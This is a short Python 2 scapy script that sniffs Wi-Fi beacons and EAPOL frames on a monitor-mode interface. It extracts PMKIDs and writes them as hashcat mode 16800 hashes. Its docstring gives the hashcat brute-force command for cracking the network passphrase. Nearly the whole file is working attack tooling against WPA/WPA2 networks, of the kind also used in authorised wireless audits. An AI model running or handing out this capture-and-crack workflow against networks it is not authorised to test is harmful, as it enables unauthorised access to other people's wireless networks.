#!/usr/bin/python2
"""
./hashcat64.bin -m 16800 hashes.file -a 3 -w 3 <psk>

Adjust under __main__ accordingly prior to launch
"""
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import packetEssentials as PE
import os

## Dict setup
essidDict = {}
pmkDict = {}

## FS cleanup
try:
    os.remove('hashes.file')
except:
    pass

def pmkRip(packet):
    """Attempt to rip the PMKID"""
    pmkid = PE.pt.byteRip(packet[Raw].load,
                          order = 'last',
                          qty = 16,
                          compress = True)
    if pmkid[-1] != 0:
        return pmkid
    else:
        return False


def pHandler(packet):
    """Packet Handler"""
    ## BEACONS
    if packet.haslayer(Dot11Beacon):
        ## ESSID MAC: ESSID
        essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})
    
    ## EAPOLs
    elif packet.haslayer(EAPOL):
        ## AES == 89, TKIP == 8a
        if PE.pt.byteRip(packet[Raw], qty = 3)[6:] == '89' or\
            PE.pt.byteRip(packet[Raw], qty = 3)[6:] == '8a':
            
            ## Assume we've already seen the beacon, ignore chicken/egg scenario
            pmkID = pmkRip(packet)
            if pmkID is not False:
                ## ESSID MAC: packet
                pmkDict.update({packet[Dot11].addr2: packet})
                
                ## Set PMKID
                ourHash = pmkID + '*'
                
                ## BSSID
                ourHash += packet[Dot11].addr2.replace(':', '') + '*'
                
                ## Tgt MAC
                ourHash += packet[Dot11].addr1.replace(':', '') + '*'
                
                ## ESSID
                try:
                    ourHash += essidDict.get(packet[Dot11].addr2).encode('hex')
                    print ourHash + ' -- ' + essidDict.get(packet[Dot11].addr2) + ' -- ' + packet[Dot11].addr2 + '\n'
                    with open('hashes.file', 'a') as oFile:
                        oFile.write(ourHash + '\n')
                except:
                    pass
                

if __name__ == '__main__':
    p = sniff(iface = 'wlan1mon',
              prn = pHandler,
              lfilter = lambda x: x.haslayer(Dot11Beacon) or x.haslayer(EAPOL),
              store = 0)
